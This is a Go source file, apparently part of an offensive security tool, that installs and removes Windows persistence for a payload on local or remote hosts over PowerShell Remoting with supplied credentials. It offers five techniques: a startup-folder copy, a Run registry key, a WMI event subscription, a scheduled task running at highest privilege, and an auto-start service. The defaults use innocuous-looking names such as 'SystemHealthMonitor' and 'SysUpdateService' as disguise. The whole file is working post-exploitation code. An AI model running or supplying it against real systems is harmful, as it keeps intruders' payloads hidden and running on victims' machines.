package persistence

import (
	"fmt"
	"os/exec"
	"strings"
)

// PersistenceConfig 持久化配置结构体
type PersistenceConfig struct {
	Target      string
	Username    string
	Password    string
	Technique   string // startup/registry/wmi/scheduledtask/service
	PayloadPath string
	ServiceName string
	TaskName    string
	Description string
	Interval    string // 适用于计划任务和WMI
}

// PersistenceResult 持久化操作结果
type PersistenceResult struct {
	Success   bool
	Message   string
	Technique string
}

// PersistenceClient 持久化客户端
type PersistenceClient struct {
	Config *PersistenceConfig
}

// NewPersistenceClient 创建新的持久化客户端
func NewPersistenceClient(config *PersistenceConfig) *PersistenceClient {
	return &PersistenceClient{Config: config}
}

// CreatePersistence 创建持久化
func (p *PersistenceClient) CreatePersistence() (*PersistenceResult, error) {
	switch strings.ToLower(p.Config.Technique) {
	case "startup":
		return p.addStartupItem(), nil
	case "registry":
		return p.addRegistryKey(), nil
	case "wmi":
		return p.addWMIEventSubscription(), nil
	case "scheduledtask":
		return p.addScheduledTask(), nil
	case "service":
		return p.createService(), nil
	default:
		return &PersistenceResult{Success: false, Message: "不支持的持久化技术", Technique: p.Config.Technique}, nil
	}
}

// RemovePersistence 移除持久化
func (p *PersistenceClient) RemovePersistence() (*PersistenceResult, error) {
	switch strings.ToLower(p.Config.Technique) {
	case "startup":
		return p.removeStartupItem(), nil
	case "registry":
		return p.removeRegistryKey(), nil
	case "wmi":
		return p.removeWMIEventSubscription(), nil
	case "scheduledtask":
		return p.removeScheduledTask(), nil
	case "service":
		return p.removeService(), nil
	default:
		return &PersistenceResult{Success: false, Message: "不支持的持久化技术", Technique: p.Config.Technique}, nil
	}
}

// addStartupItem 添加启动项
func (p *PersistenceClient) addStartupItem() *PersistenceResult {
	// 使用PowerShell添加启动项
	cmd := fmt.Sprintf(`Copy-Item "%s" -Destination "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"`, p.Config.PayloadPath)
	result, err := p.executeRemoteCommand(cmd)
	if err != nil {
		return &PersistenceResult{Success: false, Message: fmt.Sprintf("添加启动项失败: %v", err), Technique: "startup"}
	}
	return &PersistenceResult{Success: true, Message: fmt.Sprintf("启动项添加成功: %s", result), Technique: "startup"}
}

// removeStartupItem 移除启动项
func (p *PersistenceClient) removeStartupItem() *PersistenceResult {
	filename := strings.Split(p.Config.PayloadPath, "\\")
	if len(filename) == 0 {
		return &PersistenceResult{Success: false, Message: "无效的payload路径", Technique: "startup"}
	}
	cmd := fmt.Sprintf(`Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\%s" -Force`, filename[len(filename)-1])
	result, err := p.executeRemoteCommand(cmd)
	if err != nil {
		return &PersistenceResult{Success: false, Message: fmt.Sprintf("移除启动项失败: %v", err), Technique: "startup"}
	}
	return &PersistenceResult{Success: true, Message: fmt.Sprintf("启动项移除成功: %s", result), Technique: "startup"}
}

// addRegistryKey 添加注册表自启动项
func (p *PersistenceClient) addRegistryKey() *PersistenceResult {
	// 添加到HKCU\Software\Microsoft\Windows\CurrentVersion\Run
	cmd := fmt.Sprintf(`Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'GYscanUpdate' -Value "%s"`, p.Config.PayloadPath)
	result, err := p.executeRemoteCommand(cmd)
	if err != nil {
		return &PersistenceResult{Success: false, Message: fmt.Sprintf("添加注册表键值失败: %v", err), Technique: "registry"}
	}
	return &PersistenceResult{Success: true, Message: fmt.Sprintf("注册表自启动项添加成功: %s", result), Technique: "registry"}
}

// removeRegistryKey 移除注册表自启动项
func (p *PersistenceClient) removeRegistryKey() *PersistenceResult {
	cmd := `Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'GYscanUpdate' -Force`
	result, err := p.executeRemoteCommand(cmd)
	if err != nil {
		return &PersistenceResult{Success: false, Message: fmt.Sprintf("移除注册表键值失败: %v", err), Technique: "registry"}
	}
	return &PersistenceResult{Success: true, Message: fmt.Sprintf("注册表自启动项移除成功: %s", result), Technique: "registry"}
}

// addWMIEventSubscription 添加WMI事件订阅
func (p *PersistenceClient) addWMIEventSubscription() *PersistenceResult {
	// 默认描述
	if p.Config.Description == "" {
		p.Config.Description = "系统性能监控"
	}
	// 默认间隔（分钟）
	if p.Config.Interval == "" {
		p.Config.Interval = "5"
	}
	
	cmd := fmt.Sprintf(`$filterName = "SystemHealthMonitor"; $consumerName = "SystemHealthAction"; $query = "SELECT * FROM __InstanceModificationEvent WITHIN %s WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"; $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name=$filterName; EventNameSpace="root\cimv2"; QueryLanguage="WQL"; Query=$query}; $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name=$consumerName; CommandLineTemplate="%s"}; Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$filter; Consumer=$consumer}`, p.Config.Interval, p.Config.PayloadPath)
	result, err := p.executeRemoteCommand(cmd)
	if err != nil {
		return &PersistenceResult{Success: false, Message: fmt.Sprintf("添加WMI事件订阅失败: %v", err), Technique: "wmi"}
	}
	return &PersistenceResult{Success: true, Message: fmt.Sprintf("WMI事件订阅添加成功: %s", result), Technique: "wmi"}
}

// removeWMIEventSubscription 移除WMI事件订阅
func (p *PersistenceClient) removeWMIEventSubscription() *PersistenceResult {
	cmd := `$filter = Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='SystemHealthMonitor'"; $consumer = Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='SystemHealthAction'"; $binding = Get-WmiObject -Namespace root\subscription -Query "SELECT * FROM __FilterToConsumerBinding WHERE Filter='\\root\\subscription:' + $filter.__RELPATH AND Consumer='\\root\\subscription:' + $consumer.__RELPATH"; if($binding){$binding.Delete()}; if($consumer){$consumer.Delete()}; if($filter){$filter.Delete()}`
	result, err := p.executeRemoteCommand(cmd)
	if err != nil {
		return &PersistenceResult{Success: false, Message: fmt.Sprintf("移除WMI事件订阅失败: %v", err), Technique: "wmi"}
	}
	return &PersistenceResult{Success: true, Message: fmt.Sprintf("WMI事件订阅移除成功: %s", result), Technique: "wmi"}
}

// addScheduledTask 添加计划任务
func (p *PersistenceClient) addScheduledTask() *PersistenceResult {
	// 默认任务名和描述
	if p.Config.TaskName == "" {
		p.Config.TaskName = "SystemMaintenance"
	}
	if p.Config.Description == "" {
		p.Config.Description = "系统维护任务"
	}
	// 默认间隔（分钟）
	if p.Config.Interval == "" {
		p.Config.Interval = "10"
	}
	
	cmd := fmt.Sprintf(`$action = New-ScheduledTaskAction -Execute "%s"; $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes %s); Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "%s" -Description "%s" -RunLevel Highest -Force`, p.Config.PayloadPath, p.Config.Interval, p.Config.TaskName, p.Config.Description)
	result, err := p.executeRemoteCommand(cmd)
	if err != nil {
		return &PersistenceResult{Success: false, Message: fmt.Sprintf("添加计划任务失败: %v", err), Technique: "scheduledtask"}
	}
	return &PersistenceResult{Success: true, Message: fmt.Sprintf("计划任务添加成功: %s", result), Technique: "scheduledtask"}
}

// removeScheduledTask 移除计划任务
func (p *PersistenceClient) removeScheduledTask() *PersistenceResult {
	if p.Config.TaskName == "" {
		p.Config.TaskName = "SystemMaintenance"
	}
	cmd := fmt.Sprintf(`Unregister-ScheduledTask -TaskName "%s" -Confirm:$false`, p.Config.TaskName)
	result, err := p.executeRemoteCommand(cmd)
	if err != nil {
		return &PersistenceResult{Success: false, Message: fmt.Sprintf("移除计划任务失败: %v", err), Technique: "scheduledtask"}
	}
	return &PersistenceResult{Success: true, Message: fmt.Sprintf("计划任务移除成功: %s", result), Technique: "scheduledtask"}
}

// createService 创建服务
func (p *PersistenceClient) createService() *PersistenceResult {
	// 默认服务名
	if p.Config.ServiceName == "" {
		p.Config.ServiceName = "SysUpdateService"
	}
	if p.Config.Description == "" {
		p.Config.Description = "系统更新服务"
	}
	
	cmd := fmt.Sprintf(`New-Service -Name "%s" -BinaryPathName "%s" -DisplayName "%s" -Description "%s" -StartupType Automatic; Start-Service -Name "%s"`, p.Config.ServiceName, p.Config.PayloadPath, p.Config.ServiceName, p.Config.Description, p.Config.ServiceName)
	result, err := p.executeRemoteCommand(cmd)
	if err != nil {
		return &PersistenceResult{Success: false, Message: fmt.Sprintf("创建服务失败: %v", err), Technique: "service"}
	}
	return &PersistenceResult{Success: true, Message: fmt.Sprintf("服务创建并启动成功: %s", result), Technique: "service"}
}

// removeService 移除服务
func (p *PersistenceClient) removeService() *PersistenceResult {
	if p.Config.ServiceName == "" {
		p.Config.ServiceName = "SysUpdateService"
	}
	cmd := fmt.Sprintf(`Stop-Service -Name "%s" -Force; Remove-Service -Name "%s"`, p.Config.ServiceName, p.Config.ServiceName)
	result, err := p.executeRemoteCommand(cmd)
	if err != nil {
		return &PersistenceResult{Success: false, Message: fmt.Sprintf("移除服务失败: %v", err), Technique: "service"}
	}
	return &PersistenceResult{Success: true, Message: fmt.Sprintf("服务停止并移除成功: %s", result), Technique: "service"}
}

// executeRemoteCommand 执行远程命令
func (p *PersistenceClient) executeRemoteCommand(cmd string) (string, error) {
	// 这里使用本地命令执行作为示例，如果需要远程执行，可以使用类似DCOM或SMB的方式
	// 实际实现时需要根据配置决定是本地还是远程执行
	if p.Config.Target != "" && p.Config.Target != "localhost" && p.Config.Target != "127.0.0.1" {
		// 构建远程执行命令（使用PowerShell Remoting）
		securePassword := fmt.Sprintf(`ConvertTo-SecureString -String "%s" -AsPlainText -Force`, p.Config.Password)
		credential := fmt.Sprintf(`New-Object System.Management.Automation.PSCredential ("%s", %s)`, p.Config.Username, securePassword)
		invokeCommand := fmt.Sprintf(`Invoke-Command -ComputerName %s -Credential %s -ScriptBlock {%s}`, p.Config.Target, credential, cmd)
		
		// 执行PowerShell命令
		powershellCmd := exec.Command("powershell", "-Command", invokeCommand)
		output, err := powershellCmd.CombinedOutput()
		return string(output), err
	}
	
	// 本地执行
	powershellCmd := exec.Command("powershell", "-Command", cmd)
	output, err := powershellCmd.CombinedOutput()
	return string(output), err
}

// ListPersistenceTechniques 列出支持的持久化技术
func ListPersistenceTechniques() []string {
	return []string{
		"startup",        // 启动文件夹
		"registry",       // 注册表自启动项
		"wmi",           // WMI事件订阅
		"scheduledtask", // 计划任务
		"service",       // Windows服务
	}
}